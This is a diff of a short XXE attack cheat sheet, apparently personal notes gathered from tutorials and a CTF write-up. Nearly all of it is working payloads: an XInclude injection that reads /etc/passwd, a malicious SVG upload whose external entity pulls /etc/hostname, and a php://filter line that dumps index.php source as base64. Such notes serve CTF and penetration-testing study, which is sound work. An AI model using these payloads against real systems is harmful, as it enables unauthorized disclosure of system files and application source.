@@ -72,13 +72,14 @@ https://viblo.asia/p/xxe-injection-vulnerabilities-phan-4-Ny0VGEmDJPA
 productId=<foo xmlns:link="http://www.w3.org/2001/XInclude">
 <link:include parse="text" href="file:///etc/passwd"/></foo>&StoreId=3
 #-------------------------------UPload file
+https://viblo.asia/p/tim-hieu-va-khai-thac-loi-xxe-bJzKmVgYZ9N
 create file.svg with content
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE slove [ <!ENTITY flag SYSTEM "file:///etc/hostname">] >
 <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
 <text font-size="16" x="0" y="16">&flag</text></svg>
-
-https://viblo.asia/p/tim-hieu-va-khai-thac-loi-xxe-bJzKmVgYZ9N
+--------------------------------------------------------
+php://filter/read=convert.base64-encode/resource=index.php
 #--------------------------------XXE + RCE
 https://ctf.zeyu2001.com/2021/spbctfs-student-ctf-quals/31-line-php
 #-----------------------------------prevent
